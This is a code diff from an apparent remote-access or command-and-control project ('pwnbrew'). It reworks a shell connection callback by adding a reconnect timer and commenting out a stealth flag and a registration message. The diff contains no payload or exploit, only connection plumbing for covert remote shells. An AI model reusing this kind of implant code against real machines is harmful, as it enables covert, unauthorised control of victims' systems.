@@ -45,9 +45,8 @@ import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.ConnectionCallback;
 import pwnbrew.network.RegisterMessage;
 import pwnbrew.network.control.messages.CreateShellAck;
-import pwnbrew.network.control.messages.NoOp;
 import pwnbrew.selector.SocketChannelHandler;
-import pwnbrew.utilities.DebugPrinter;
+import pwnbrew.utilities.ReconnectTimer;
 
 /**
  *
@@ -65,9 +64,10 @@ public class ShellConnectionCallback extends ConnectionCallback{
      * @param passedPort
      * @param passedManager 
      * @param passedShell 
+     * @param passedTimer 
      */
-    public ShellConnectionCallback( String serverIp, int passedPort, PortManager passedManager, Shell passedShell ) {
-        super(serverIp, passedPort);
+    public ShellConnectionCallback( String serverIp, int passedPort, PortManager passedManager, Shell passedShell, ReconnectTimer passedTimer ) {
+        super(serverIp, passedPort, passedTimer);
         theManager = passedManager;
         theShell = passedShell;
     }   
@@ -80,17 +80,20 @@ public class ShellConnectionCallback extends ConnectionCallback{
     @Override
     public void handleConnection( int theChannelId ) {
         
+        //Call the parent class function first
+        super.handleConnection(theChannelId);
+        
         ClientPortRouter aPR = (ClientPortRouter) theManager.getPortRouter( socketPort );
         if(theChannelId != 0 ){
             
-            ClientConfig theConf = ClientConfig.getConfig();
-            byte stlth_val = 0;
-            if( theConf.useStealth() )
-                stlth_val = 1;   
+//            ClientConfig theConf = ClientConfig.getConfig();
+//            byte stlth_val = 0;
+//            if( theConf.useStealth() )
+//                stlth_val = 1;   
 
             //Queue register message
-            RegisterMessage aMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, theChannelId);
-            DataManager.send(theManager, aMsg);
+//            RegisterMessage aMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, theChannelId);
+//            DataManager.send(theManager, aMsg);
             
             //Send ack back to set channel id
             CreateShellAck retMsg = new CreateShellAck( theChannelId );
@@ -105,10 +108,13 @@ public class ShellConnectionCallback extends ConnectionCallback{
             OutgoingConnectionManager aOCM = aPR.getConnectionManager();
             aOCM.setShell( theChannelId, theShell );
             
+            //Notify the thread
+            //theReconnectThread.beNotified();
+            
             //Send & Receive message
-            SocketChannelHandler aSCH =  aPR.getConnectionManager().getSocketChannelHandler(theChannelId);
-            if( aSCH != null )
-                aSCH.signalSend();            
+//            SocketChannelHandler aSCH =  aPR.getConnectionManager().getSocketChannelHandler(theChannelId);
+//            if( aSCH != null )
+//                aSCH.signalSend();            
 
         }
     }
